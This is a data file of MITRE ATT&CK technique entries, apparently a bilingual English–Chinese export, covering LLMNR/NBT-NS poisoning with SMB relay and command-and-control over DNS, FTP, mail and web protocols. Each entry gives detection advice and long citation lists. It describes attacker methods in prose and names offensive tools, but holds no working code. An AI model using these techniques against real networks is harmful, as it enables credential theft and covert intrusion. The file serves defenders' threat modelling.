Deploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)",Windows,"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification",True,T1557,,"Andrew Allen, @whitehat_zero; Eric Kuehn, Secure Ideas; Matthew Demaske, Adaptforward",,,,,,,"(Citation: Impacket Tools),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: GitHub Inveigh),(Citation: GitHub Pupy),(Citation: GitHub Responder),(Citation: Github PowerShell Empire),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub PoshC2),(Citation: Microsoft SMB Packet Signing),(Citation: byt3bl33d3r NTLM Relaying),(Citation: Secure Ideas SMB Relay),(Citation: ADSecurity Windows Secure Baseline)",中间人攻击：LLMNR/NBT-NS 中毒和 SMB 中继,通过响应 LLMNR/NBT-NS 网络流量，攻击者可能会欺骗名称解析的权威来源，以强制与攻击者控制的系统进行通信。此活动可用于收集或转发认证材料。链路本地多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 是 Microsoft Windows 组件，可用作主机识别的替代方法。 LLMNR 基于域名系统 (DNS) 格式，允许同一本地链接上的主机为其他主机执行名称解析。 NBT-NS 通过其 NetBIOS 名称识别本地网络上的系统。 （引文：Wikipedia LLMNR）（引文：TechNet NetBIOS）攻击者可以通过响应 LLMNR (UDP 5355)/NBT-NS (UDP 137) 流量来欺骗受害网络上名称解析的权威来源，就好像他们知道受害者网络的身份一样请求的主机，有效地毒化服务，以便受害者与对手控制的系统进行通信。如果请求的主机属于需要识别/验证的资源，则用户名和 NTLMv2 哈希将被发送到攻击者控制的系统。然后，攻击者可以通过监控端口流量的工具或通过[网络嗅探]（https://attack.mitre.org/techniques/T1040）收集通过网络发送的哈希信息，并通过[蛮力]离线破解哈希](https://attack.mitre.org/techniques/T1110) 获取明文密码。在某些情况下，攻击者可以访问系统之间的身份验证路径中的系统，或者当使用凭据的自动扫描尝试对攻击者控制的系统进行身份验证时，NTLMv2 哈希可以被截获并中继以访问和执行针对攻击者控制的系统的代码。目标系统。中继步骤可能与中毒一起发生，但也可能与中毒无关。（引用：byt3bl33d3r NTLM 中继）（引用：安全想法 SMB 中继）此外，攻击者可能会将 NTLMv1/v2 哈希封装到各种协议中，例如 LDAP、 SMB、MSSQL 和 HTTP，通过有效的 NTLM 响应扩展和使用多个服务。可以使用几种工具来毒害本地网络中的名称服务，例如 NBNSpoof、Metasploit 和 [Responder](https://attack.mitre.org/software/S0174)。（引用：GitHub NBNSpoof）（引用：Rapid7 LLMNR Spoofer )（引用：GitHub 响应者）
T1071,Application Layer Protocol,"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",https://attack.mitre.org/techniques/T1071,31 May 2017,21 October 2020,2.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: Talos Rocke August 2018),(Citation: Unit 42 Lucifer June 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Unit 42 Siloscape Jun 2021),(Citation: US-CERT TA18-074A),(Citation: Symantec W32.Duqu),(Citation: cobaltstrike manual),(Citation: Trend Micro TeamTNT),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Regin),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Unit 42 Hildegard Malware),",应用层协议,攻击者可以使用应用层协议进行通信，通过与现有流量混合来避免检测/网络过滤。远程系统的命令，通常是这些命令的结果，将嵌入客户端和服务器之间的协议流量中。攻击者可能会使用许多不同的协议，包括用于网页浏览、传输文件、电子邮件或 DNS 的协议。对于在 enclave 内部发生的连接（例如代理或枢轴节点与其他节点之间的连接），常用的协议是 SMB、SSH 或 RDP。
T1071.004,Application Layer Protocol: DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",https://attack.mitre.org/techniques/T1071/004,15 March 2020,17 June 2022,1.1,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for DNS traffic to/from known-bad or suspicious domains.","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,"Chris Heald; Jan Petrov, Citi",,,,,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ESET Gelsemium June 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: ThreatStream Evasion Analysis),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: fsecure NanHaiShu July 2016),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: FireEye APT32 May 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: ESET Ebury Feb 2014),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: CopyKittens Nov 2015),(Citation: Talos Cobalt Strike September 2020),(Citation: PWC WellMess July 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Cisco DNSMessenger March 2017),(Citation: Unit 42 Playbook Dec 2017),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Group IB APT 41 June 2021),(Citation: NCSC APT29 July 2020),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Palo Alto OilRig Sep 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Accenture Lyceum Targets November 2021),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: Palo Alto OilRig May 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Cybereason Oceanlotus May 2017),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Remsec IOCs),(Citation: FireEye FiveHands April 2021),(Citation: FireEye APT41 Aug 2019),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: GitHub Sliver C2 DNS),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Dell TG-3390),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: cobaltstrike manual),(Citation: Medium Anchor DNS July 2020),(Citation: Zscaler Cobian Aug 2017),(Citation: Unit42 RDAT July 2020),(Citation: Palo Alto DNS Requests),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: PaloAlto DNS Requests May 2016),(Citation: NCC Group Chimera January 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Check Point APT34 April 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: BlackBerry CostaRicto November 2020),(Citation: Mythc Documentation),(Citation: FireEye APT34 July 2019),(Citation: FireEye FIN7 Aug 2018),(Citation: Kaspersky ProjectSauron Full Report),(Citation: FireEye APT34 Dec 2017),(Citation: FireEye FIN7 March 2017),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Securelist Denis April 2017),",应用层协议：DNS,攻击者可以使用域名系统 (DNS) 应用层协议进行通信，通过与现有流量混合来避免检测/网络过滤。远程系统的命令，通常是这些命令的结果，将嵌入客户端和服务器之间的协议流量中。 DNS 协议在计算机网络中提供管理功能，因此在环境中可能非常常见。甚至在网络身份验证完成之前，也可能允许 DNS 流量。 DNS 数据包包含许多可以隐藏数据的字段和标头。通常称为 DNS 隧道，攻击者可能会滥用 DNS 与受害网络中受其控制的系统进行通信，同时还模仿正常的预期流量。（引文：PAN DNS 隧道）（引文：中 DnsTunneling）
T1071.002,Application Layer Protocol: File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/002,15 March 2020,21 August 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,,,,,,,,"(Citation: Unit 42 NOKKI Sept 2018),(Citation: FireEye APT41 March 2020),(Citation: ESET Machete July 2019),(Citation: McAfee Honeybee),(Citation: ESET Attor Oct 2019),(Citation: Unit42 SilverTerrier 2018),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Talos PoetRAT October 2020),(Citation: Mythc Documentation),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: XAgentOSX 2017),(Citation: Talos ZxShell Oct 2014),(Citation: Microsoft PLATINUM April 2016),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: 360 Machete Sep 2020),(Citation: Cylance Machete Mar 2017),",应用层协议：文件传输协议,攻击者可以使用与传输文件相关的应用层协议进行通信，以避免通过与现有流量混合来进行检测/网络过滤。远程系统的命令，通常是这些命令的结果，将嵌入客户端和服务器之间的协议流量中。传输文件的 FTP、FTPS 和 TFTP 等协议在环境中可能非常常见。从这些协议产生的数据包可能有许多可以隐藏数据的字段和标头。数据也可以隐藏在传输的文件中。攻击者可能滥用这些协议与受害网络中受其控制的系统进行通信，同时模仿正常的预期流量。
T1071.003,Application Layer Protocol: Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/003,15 March 2020,21 October 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,,,,,,,,"(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Unit42 Sofacy Dec 2018),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Unit42 SilverTerrier 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Talos NavRAT May 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit42 Cannon Nov 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Microsoft SIR Vol 19),(Citation: Symantec Remsec IOCs),(Citation: ESET Sednit Part 2),(Citation: FireEye APT28),(Citation: ESET ComRAT May 2020),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Zebrocy May 2019),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Unit42 RDAT July 2020),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Bitdefender Agent Tesla April 2020),(Citation: ESET LightNeuron May 2019),(Citation: Fortinet Agent Tesla June 2017),",应用层协议：邮件协议,攻击者可以使用与电子邮件传递相关的应用层协议进行通信，以避免通过与现有流量混合来进行检测/网络过滤。远程系统的命令，通常是这些命令的结果，将嵌入客户端和服务器之间的协议流量中。承载电子邮件的协议（例如 SMTP/S、POP3/S 和 IMAP）在环境中可能非常常见。从这些协议产生的数据包可能有许多可以隐藏数据的字段和标头。数据也可以隐藏在电子邮件消息本身中。攻击者可能滥用这些协议与受害网络中受其控制的系统进行通信，同时模仿正常的预期流量。
T1071.001,Application Layer Protocol: Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",https://attack.mitre.org/techniques/T1071/001,15 March 2020,26 March 2020,1.0,Command and Control,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)

Monitor for web traffic to/from known-bad or suspicious domains. ","Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1071,,,,,,,,,"(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: ESET Gamaredon June 2020),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Volexity OceanLotus Nov 2017),(Citation: ESET Crutch December 2020),(Citation: Unit 42 Inception November 2018),(Citation: Symantec Remsec IOCs),(Citation: GitHub Sliver C2),(Citation: Kaspersky QakBot September 2021),(Citation: ESET Zebrocy Nov 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Unit42 Emissary Panda May 2019),(Citation: Cylance Machete Mar 2017),(Citation: wardle evilquest partii),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT10 April 2017),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: KISA Operation Muzabi),(Citation: Mythc Documentation),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Crowdstrike Qakbot October 2020),(Citation: FireEye APT34 Dec 2017),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Sofacy Komplex Trojan),(Citation: McAfee Sharpshooter December 2018),(Citation: Unit42 Sofacy Dec 2018),(Citation: Unit 42 Valak July 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: McAfee Maze March 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Donut Github),(Citation: 360 Machete Sep 2020),(Citation: Anomali Rocke March 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Aqua Kinsing April 2020),(Citation: F-Secure CozyDuke),(Citation: BlackBerry Amadey 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Check Point APT34 April 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: IBM TA505 April 2020),(Citation: Talos ROKRAT),(Citation: Cylance Dust Storm),(Citation: McAfee Lazarus Jul 2020),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Fortinet Agent Tesla June 2017),(Citation: Kaspersky Dridex May 2017),(Citation: Morphisec ShellTea June 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: PWC WellMess July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: McAfee Dianxun March 2021),(Citation: Lazarus APT January 2022),(Citation: Securelist Remexi Jan 2019),(Citation: Unit42 Cannon Nov 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro njRAT 2018),(Citation: PWC WellMess C2 August 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Securelist APT10 March 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Fortinet Diavol July 2021),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Intezer Doki July 20),(Citation: Rancor Unit42 June 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Forcepoint Felismus Mar 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Machete July 2019),(Citation: Microsoft POLONIUM June 2022),(Citation: Accenture Lyceum Targets November 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Dell TG-3390),(Citation: FireEye APT38 Oct 2018),(Citation: Unit42 RDAT July 2020),(Citation: Bitdefender Naikon April 2021),(Citation: PaloAlto DNS Requests May 2016),(Citation: FireEye APT29),(Citation: Juniper IcedID June 2020),(Citation: CISA WellMess July 2020),(Citation: Kaspersky Regin),(Citation: Malwarebytes Dyreza November 2015),(Citation: CISA SoreFang July 2016),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Sofacy),(Citation: TrendMicro Taidoor),(Citation: Securelist Octopus Oct 2018),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Dell Sakula),(Citation: Cybereason Chaes Nov 2020),(Citation: Trusteer Carberp October 2010),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Intel 471 REvil March 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: reed thiefquest ransomware analysis),(Citation: McAfee Night Dragon),(Citation: Unit42 SilverTerrier 2018),(Citation: CERT-EE Gamaredon January 2021),(Citation: Malwarebytes Pony April 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: Unit 42 VERMIN Jan 2018),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: Unit 42 PingPull Jun 2022),(Citation: FireEye HAWKBALL Jun 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Talos Konni May 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Baumgartner Naikon 2015),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Symantec Dyre June 2015),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Secureworks REvil September 2019),(Citation: Talos Group123),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: Moran 2013),(Citation: Kaspersky Turla),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: ESET Dukes October 2019),(Citation: GitHub PoshC2),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: objective-see windtail2 jan 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: F-Secure The Dukes),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: DustySky),(Citation: Sofacy DealersChoice),(Citation: Lab52 WIRTE Apr 2019),(Citation: Lazarus RATANKBA),(Citation: Unit 42 NETWIRE April 2020),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: CrowdStrike Putter Panda),(Citation: objsee mac malware 2017),(Citation: TrendMicro BlackTech June 2017),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Kaspersky WIRTE November 2021),(Citation: Mandiant APT1 Appendix),(Citation: TrendMicro Gamaredon April 2020),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: NCC Group Chimera January 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye EPS Awakens Part 2),(Citation: ESET Gazer Aug 2017),(Citation: Unit 42 MechaFlounder March 2019),(Citation: FireEye Fin8 May 2016),(Citation: Volexity SolarWinds),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Bankshot),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: Lotus Blossom Dec 2015),(Citation: Cylance Sodinokibi July 2019),(Citation: ESET Sednit Part 1),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: RATANKBA),(Citation: JPCERT ChChes Feb 2017),(Citation: ESET Sednit Part 2),(Citation: Talos Promethium June 2020),(Citation: Talos Micropsia June 2017),(Citation: Symantec Shuckworm January 2022),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Proofpoint TA459 April 2017),(Citation: FireEye APT34 July 2019),(Citation: Unit42 Xbash Sept 2018),(Citation: ProofPoint Ursnif Aug 2016),(Citation: SecureWorks August 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Unit42 Redaman January 2019),(Citation: Fidelis INOCNATION),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Profero APT27 December 2020),(Citation: Palo Alto OilRig May 2016),(Citation: ESET Industroyer),(Citation: FireEye APT19),(Citation: Recorded Future REDDELTA July 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Trend Micro IXESHE 2012),(Citation: CISA ComRAT Oct 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Elfin Mar 2019),(Citation: F-Secure Cosmicduke),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Lotus Blossom Jun 2015),(Citation: Infoblox Lokibot January 2019),(Citation: Intezer TeamTNT September 2020),(Citation: ESET ComRAT May 2020),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Talos Zeus Panda Nov 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Telebots Dec 2016),(Citation: FireEye SMOKEDHAM June 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye APT41 March 2020),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: ESET Gelsemium June 2021),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Talos Frankenstein June 2019),(Citation: FireEye FiveHands April 2021),(Citation: synack 2016 review),(Citation: FireEye FELIXROOT July 2018),(Citation: cobaltstrike manual),(Citation: F-Secure BlackEnergy 2014),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Talos PoetRAT October 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: Cybereason Valak May 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: NCSC APT29 July 2020),(Citation: FireEye Ursnif Nov 2017),(Citation: ESET Zebrocy May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Palo Alto Comnie),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Accenture HyperStack October 2020),(Citation: Symantec Vasport May 2012),(Citation: FireEye admin@338),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Palo Alto menuPass Feb 2017),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Kaspersky Carbanak),(Citation: Scarlet Mimic Jan 2016),(Citation: ClearSky MuddyWater June 2019),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: McAfee Gold Dragon),(Citation: Microsoft SIR Vol 19),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye APT28),(Citation: Radware Micropsia July 2018),(Citation: NSA/FBI Drovorub August 2020),(Citation: McAfee GhostSecret),(Citation: ESET Grandoreiro April 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Microsoft PLATINUM April 2016),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Microsoft Actinium February 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: ThreatStream Evasion Analysis),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 BadPatch Oct 2017),(Citation: NCC Group Team9 June 2020),(Citation: GitHub Pupy),(Citation: Symantec Orangeworm IOCs April 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: JPCert BlackTech Malware September 2019),(Citation: BitDefender Chafer May 2020),(Citation: NCCGroup RokRat Nov 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Talos GravityRAT),(Citation: Intrinsec Egregor Nov 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: Talos TinyTurla September 2021),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT30),(Citation: Trend Micro TeamTNT),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Moran 2014),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Hogfish April 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Secureworks MCMD July 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET GreyEnergy Oct 2018),(Citation: Anomali Pirate Panda April 2020),(Citation: ESET Turla 